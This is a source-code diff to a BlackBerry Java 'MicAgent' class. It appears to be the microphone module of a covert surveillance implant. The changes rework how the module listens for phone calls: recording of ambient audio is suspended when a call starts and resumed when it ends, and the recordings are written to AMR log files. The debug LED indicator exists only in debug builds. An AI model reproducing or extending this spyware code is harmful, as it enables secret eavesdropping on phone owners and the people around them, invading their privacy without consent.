@@ -11,7 +11,9 @@ package blackberry.agent;
 
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneCall;
+import net.rim.blackberry.api.phone.PhoneListener;
 import net.rim.device.api.util.DataBuffer;
+import blackberry.AgentManager;
 import blackberry.AppListener;
 import blackberry.Conf;
 import blackberry.debug.Debug;
@@ -22,7 +24,6 @@ import blackberry.interfaces.PhoneCallObserver;
 import blackberry.log.Log;
 import blackberry.log.LogType;
 import blackberry.record.AudioRecorder;
-import blackberry.record.AudioRecorderDispatcher;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
@@ -31,10 +32,12 @@ import blackberry.utils.Utils;
 /**
  * The Class MicAgent.
  */
-public final class MicAgent extends Agent implements PhoneCallObserver {
+public final class MicAgent extends Agent implements PhoneListener {
     private static final long MIC_PERIOD = 5000;
     static final int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5,
             5, 0, 0, 0, 0 };
+
+    public static final int COLOR_LIGHT_BLUE = 0x00C8F0FF;
 
     //#ifdef DEBUG
     static Debug debug = new Debug("MicAgent", DebugLevel.VERBOSE);
@@ -44,11 +47,12 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
     AutoFlashFile amrfile;
     //#endif
 
-    AudioRecorderDispatcher recorder;
+    //AudioRecorderDispatcher recorder;
     long fId;
 
     boolean suspended = false;
     Object suspendedLock = new Object();
+    private AudioRecorder recorder;
 
     /**
      * Instantiates a new mic agent.
@@ -82,7 +86,9 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
         debug.info("start");
         //#endif
 
-        AppListener.getInstance().addPhoneCallObserver(this);
+        //AppListener.getInstance().addPhoneCallObserver(this);
+        Phone.addPhoneListener(this);
+        
         synchronized (suspendedLock) {
             suspended = false;
             startRecorder();
@@ -97,7 +103,7 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
         debug.info("stop");
         //#endif
 
-        AppListener.getInstance().removePhoneCallObserver(this);
+        Phone.removePhoneListener(this);
 
         synchronized (suspendedLock) {
             suspended = false;
@@ -110,7 +116,7 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
 
     }
 
-    void startRecorder() {
+    synchronized void startRecorder() {
         //#ifdef DEBUG_TRACE
         debug.trace("startRecorder");
         //#endif
@@ -129,18 +135,38 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
         Check.asserts(ret, "actualStart: cannot write file: " + filename);
         //#endif
 
-        recorder = AudioRecorderDispatcher.getInstance();
+        recorder = new AudioRecorder();
         recorder.start();
+
+        //#ifdef DEBUG_TRACE
+        debug.trace("Started: " + (recorder != null));
+        //#endif
+
+        //#ifdef DEBUG
+        debug.ledStart(COLOR_LIGHT_BLUE);
+        //#endif
     }
 
-    void stopRecorder() {
+    synchronized void stopRecorder() {
         //#ifdef DEBUG_TRACE
         debug.trace("stopRecorder");
         //#endif
 
-        if (recorder != null) {
-            recorder.stop();
+        if (recorder == null) {
+            //#ifdef DEBUG_ERROR
+            debug.error("Null recorder");
+            //#endif
+            return;
         }
+
+        //#ifdef DEBUG_INFO
+        debug.info("STOP");
+        //#endif
+
+        recorder.stop();
+        //#ifdef DEBUG
+        debug.ledStop();
+        //#endif
     }
 
     /*
@@ -158,7 +184,7 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
                     && phoneCall.getStatus() != PhoneCall.STATUS_DISCONNECTED) {
                 //#ifdef DEBUG_WARN
                 debug.warn("phone call in progress, suspend!");
-                //#endif                
+                //#endif                   
                 suspend();
             } else {
                 saveRecorderLog();
@@ -232,16 +258,7 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
         return additionalData;
     }
 
-    public void onCallAnswered(int callId, String phoneNumber) {
-    }
-
-    public void onCallConnected(int callId, String phoneNumber) {
-        //#ifdef DEBUG_TRACE
-        debug.trace("onCallConnected");
-        //#endif
-        suspend();
-    }
-
+ 
     /**
      * Suspend recording
      */
@@ -260,28 +277,25 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
             }
         }
     }
-
-    public void onCallDisconnected(int callId, String phoneNumber) {
-        //#ifdef DEBUG_TRACE
-        debug.trace("onCallDisconnected");
-        //#endif
-        suspend();
+    
+    private void resume() {
+        synchronized (suspendedLock) {
+            synchronized (suspendedLock) {
+                if (suspended) {
+                    //#ifdef DEBUG_INFO
+                    debug.info("Call: resuming recording");
+                    //#endif
+                    startRecorder();
+                    suspended = false;
+                } else {
+                    //#ifdef DEBUG_TRACE
+                    debug.trace("resume: already done");
+                    //#endif
+                }
+            }
+        }
     }
-
-    public void onCallIncoming(int callId, String phoneNumber) {
-        //#ifdef DEBUG_TRACE
-        debug.trace("onCallIncoming");
-        //#endif
-        suspend();
-    }
-
-    public void onCallInitiated(int callId, String phoneNumber) {
-        //#ifdef DEBUG_TRACE
-        debug.trace("onCallInitiated");
-        //#endif
-        suspend();
-    }
-
+  
     /*
      * (non-Javadoc)
      * @see blackberry.agent.Agent#parse(byte[])
@@ -290,5 +304,98 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
         setPeriod(MIC_PERIOD);
         setDelay(MIC_PERIOD);
         return true;
+    }
+    
+    public void callIncoming(int callId) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("callIncoming");
+        //#endif
+        
+        MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(AGENT_MIC);
+        agent.suspend();
+    }
+
+    public void callInitiated(int callid) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("callInitiated");
+        //#endif
+        MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(AGENT_MIC);
+        agent.suspend();
+    }
+    
+    public void callDisconnected(int callId) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("callDisconnected");
+        //#endif
+        MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(AGENT_MIC);
+        agent.resume();
+    }
+
+
+    public void callAdded(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callAnswered(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callConferenceCallEstablished(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callConnected(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callDirectConnectConnected(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callDirectConnectDisconnected(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callEndedByUser(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callFailed(int callId, int reason) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callHeld(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+
+
+    public void callRemoved(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callResumed(int callId) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void callWaiting(int callid) {
+        // TODO Auto-generated method stub
+        
+    }
+
+    public void conferenceCallDisconnected(int callId) {
+        // TODO Auto-generated method stub
+        
     }
 }
